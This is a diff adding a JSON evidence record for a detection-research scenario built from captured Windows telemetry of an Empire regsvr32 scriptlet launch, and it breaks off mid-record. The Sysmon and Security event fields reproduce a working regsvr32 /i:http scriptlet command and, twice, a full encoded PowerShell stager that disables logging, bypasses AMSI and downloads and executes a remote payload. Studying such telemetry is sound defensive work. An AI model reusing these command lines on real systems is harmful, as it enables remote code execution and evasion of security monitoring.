@@ -1,0 +1,454 @@
+{
+  "schema_version": "source-evidence-contract/v2",
+  "scenario_id": "regsvr32-c2",
+  "source_ground_truth": {
+    "path": "outputs/integrated/20261030_v5/consumers/regsvr32-c2/scenario_ground_truth.json",
+    "scenario_id": "regsvr32-c2",
+    "schema_version": "scenario-ground-truth/v3",
+    "sha256": "936475affb52f1e156eefd8a5dd851a8e32864b6c31a24b66b4838b1bfb35c91"
+  },
+  "units": [
+    {
+      "origin": {
+        "kind": "chunk",
+        "item_id": "retrieval-chunk--e6df48c9930387d43b1f91e9812baf382c04ffc98bb0e43aeee50b701cdcdf43",
+        "context_pointer": "/retrieval/hits/0/chunk"
+      },
+      "source": {
+        "artifact_type": "scenario_ground_truth",
+        "json_pointer": "/entities/1",
+        "object_id": "external-parent-f4ce0cf17a05c444",
+        "object_type": "entity"
+      },
+      "status": "observed",
+      "object_type": "entity",
+      "source_bound": true,
+      "source_references": [
+        {
+          "raw_record_ref": "jsonl:line:219",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:97",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        }
+      ],
+      "text": "Entity powershell.exe. Type: process. Status: observed. Attributes: {\"basis\":\"parent fields in child observation only\",\"creation_in_capture\":false,\"host\":\"WORKSTATION5.mordor.local\",\"process_guid\":\"{b59756a9-89dc-5f17-1006-000000000400}\",\"process_id\":\"8648\",\"process_name\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"}.",
+      "properties": {
+        "evidence_layer": "observed_telemetry",
+        "source_object": {
+          "attributes": {
+            "basis": "parent fields in child observation only",
+            "creation_in_capture": false,
+            "host": "WORKSTATION5.mordor.local",
+            "process_guid": "{b59756a9-89dc-5f17-1006-000000000400}",
+            "process_id": "8648",
+            "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "entity_id": "external-parent-f4ce0cf17a05c444",
+          "entity_type": "process",
+          "evidence_ids": [
+            "creation-process-1356a3e1f91322ca"
+          ],
+          "name": "powershell.exe",
+          "status": "observed"
+        }
+      },
+      "evidence_layer": "observed_telemetry"
+    },
+    {
+      "origin": {
+        "kind": "chunk",
+        "item_id": "retrieval-chunk--9e080227c8b57a09213f234d85481395b430e57fe72a5d0bc729195aa3e3e2b5",
+        "context_pointer": "/retrieval/hits/1/chunk"
+      },
+      "source": {
+        "artifact_type": "scenario_ground_truth",
+        "json_pointer": "/scenario",
+        "object_id": null,
+        "object_type": "scenario"
+      },
+      "status": "reviewable",
+      "object_type": "scenario",
+      "source_bound": true,
+      "source_references": [
+        {
+          "raw_record_ref": "jsonl:line:1001",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:1189",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:1192",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:1213",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:1284",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:1323",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:1363",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:1401",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:1437",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:2154",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:219",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:224",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:240",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:283",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:296",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:97",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        }
+      ],
+      "text": "Scenario 3.3.3 Kịch bản kết nối mạng bất thường hoặc nghi vấn C2. Description: Integrated research draft: observed telemetry, inferred correlations, candidate assessments and separate CTI context. Analysis status: draft_reviewable. Observed behavior: PowerShell parent → regsvr32 HTTP /i scriptlet command with /n → encoded PowerShell child; observed regsvr32 port8444 and child PowerShell port80 connections.",
+      "properties": {
+        "analysis_status": "draft_reviewable",
+        "observed_behavior_count": 1,
+        "scope_limitations": [
+          "Connections and command URL do not establish HTTP completion, response content, confirmed C2 purpose, exfiltration or bytes transferred.",
+          "Network and process identity links are inferred from host/GUID/lifetime; PID fallback stops at next creation/exit and has a bounded age. Ambiguous links remain separate.",
+          "Source timestamp conflicts are preserved. Canonical timestamps are not timezone-corrected. Security 5156 is inventoried separately, not counted again as Sysmon connection observations.",
+          "CTI facts are publisher-reported external context. They do not establish local host compromise, campaign attribution, HTTP completion or confirmed C2."
+        ],
+        "scope_limitations_pointer": "/summary/limitations",
+        "time_window": {
+          "end": "2020-07-22T03:28:28.429000Z",
+          "start": "2020-07-22T03:27:53.548000Z"
+        }
+      },
+      "evidence_layer": "candidate_assessment"
+    },
+    {
+      "origin": {
+        "kind": "chunk",
+        "item_id": "retrieval-chunk--6477dd1897ae50c72c716cf6a42509c23e969434ef7e5563af680664d57ab026",
+        "context_pointer": "/retrieval/hits/2/chunk"
+      },
+      "source": {
+        "artifact_type": "scenario_ground_truth",
+        "json_pointer": "/evidence/1",
+        "object_id": "creation-process-1a7b3c442952cc5a",
+        "object_type": "evidence"
+      },
+      "status": "observed",
+      "object_type": "evidence",
+      "source_bound": true,
+      "source_references": [
+        {
+          "raw_record_ref": "jsonl:line:224",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        },
+        {
+          "raw_record_ref": "jsonl:line:283",
+          "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+        }
+      ],
+      "text": "Evidence creation-process-1a7b3c442952cc5a. Type: process_creation. Summary: regsvr32.exe created powershell.exe; Security/Sysmon observations describe one creation. Status: observed. Observations: provider=Microsoft-Windows-Security-Auditing, event_id=4688, timestamp=2020-07-22T03:27:54.620000Z; provider=Microsoft-Windows-Sysmon, event_id=1, timestamp=2020-07-22T03:27:54.604000Z.",
+      "properties": {
+        "evidence_layer": "observed_telemetry",
+        "source_object": {
+          "evidence_id": "creation-process-1a7b3c442952cc5a",
+          "evidence_type": "process_creation",
+          "observations": [
+            {
+              "event_id": "1",
+              "provider": "Microsoft-Windows-Sysmon",
+              "raw_record_ref": "jsonl:line:224",
+              "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json",
+              "timestamp": "2020-07-22T03:27:54.604000Z"
+            },
+            {
+              "event_id": "4688",
+              "provider": "Microsoft-Windows-Security-Auditing",
+              "raw_record_ref": "jsonl:line:283",
+              "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json",
+              "timestamp": "2020-07-22T03:27:54.620000Z"
+            }
+          ],
+          "source_references": [
+            {
+              "raw_record_ref": "jsonl:line:224",
+              "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+            },
+            {
+              "raw_record_ref": "jsonl:line:283",
+              "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+            }
+          ],
+          "status": "observed",
+          "summary": "regsvr32.exe created powershell.exe; Security/Sysmon observations describe one creation."
+        },
+        "source_observations": [
+          {
+            "canonical_fields": {
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=",
+              "event_id": "1",
+              "host": "WORKSTATION5.mordor.local",
+              "parent_command_line": "\"C:\\windows\\system32\\regsvr32.exe\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll",
+              "parent_process_guid": "{b59756a9-b238-5f17-5207-000000000400}",
+              "parent_process_id": "9384",
+              "parent_process_name": "C:\\Windows\\System32\\regsvr32.exe",
+              "process_guid": "{b59756a9-b239-5f17-5307-000000000400}",
+              "process_id": "9076",
+              "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "provider": "Microsoft-Windows-Sysmon",
+              "raw_record_ref": "jsonl:line:224",
+              "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json",
+              "timestamp": "2020-07-22T03:27:54.604000Z",
+              "user": "MORDOR\\pgustavo"
+            },
+            "evidence_layer": "observed_telemetry",
+            "field_projection": "canonical non-null scalars plus unmapped authentication/source clock fields; originals remain upstream",
+            "original_fields": {
+              "@timestamp": "2020-07-22T03:27:54.604Z",
+              "EventID": 1,
+              "Hostname": "WORKSTATION5.mordor.local",
+              "OriginalFileName": "PowerShell.EXE",
+              "SourceName": "Microsoft-Windows-Sysmon",
+              "UtcTime": "2020-07-22 03:27:53.065"
+            },
+            "raw_record_ref": "jsonl:line:224",
+            "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json"
+          },
+          {
+            "canonical_fields": {
+              "channel": "Security",
+              "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=",
+              "event_id": "4688",
+              "host": "WORKSTATION5.mordor.local",
+              "parent_process_id": "0x24a8",
+              "parent_process_name": "C:\\Windows\\System32\\regsvr32.exe",
+              "process_id": "0x2374",
+              "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "provider": "Microsoft-Windows-Security-Auditing",
+              "raw_record_ref": "jsonl:line:283",
+              "source_file": "empire_launcher_sct_regsvr32_2020-07-21232741.json",
+              "subject_user": "pgustavo",
+              "timestamp": "2020-07-22T03:27:54.620000Z"
+            },
+            "evidence_layer": "observed_telemetry",
+            "field_projection": "canonical non-null scalars plus unmapped authentication/source clock fields; originals remain upstream",
+            "original_fields": {
+              "@timestamp": "2020-07-22T03:27:54.620Z",
+              "EventID": 4688,
